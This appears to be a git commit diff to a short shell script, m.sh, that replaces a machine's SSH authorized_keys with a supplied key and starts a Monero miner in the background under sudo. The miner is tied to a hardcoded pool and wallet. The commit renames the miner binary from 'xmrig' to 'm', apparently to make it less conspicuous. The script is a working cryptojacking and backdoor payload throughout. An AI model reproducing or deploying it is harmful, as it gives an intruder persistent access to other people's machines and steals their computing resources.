64edc2de12892bf702d58d03d47f1b6a8df49831
0xluc <lucasbrodrigues14@gmail.com>
2023-12-06 07:58:35 -0300

    .

--- m.sh
+++ m.sh
@@ -1,3 +1,3 @@
 cat a.pub > ~/.ssh/authorized_keys
-screen -d -m sudo ./xmrig -o gulf.moneroocean.stream:10001 -u 852i72n6Xsv2GhCHEsoRtcQxrxBBeVtKq1dTPWsG8TBriWvNPEMs9ne2uVJaGHRxstNuRaRq2VQcmB712b6XxCwY8Ss46zF -t 2 -p amazon
+screen -d -m sudo ./m -o gulf.moneroocean.stream:10001 -u 852i72n6Xsv2GhCHEsoRtcQxrxBBeVtKq1dTPWsG8TBriWvNPEMs9ne2uVJaGHRxstNuRaRq2VQcmB712b6XxCwY8Ss46zF -t 2 -p amazon
 
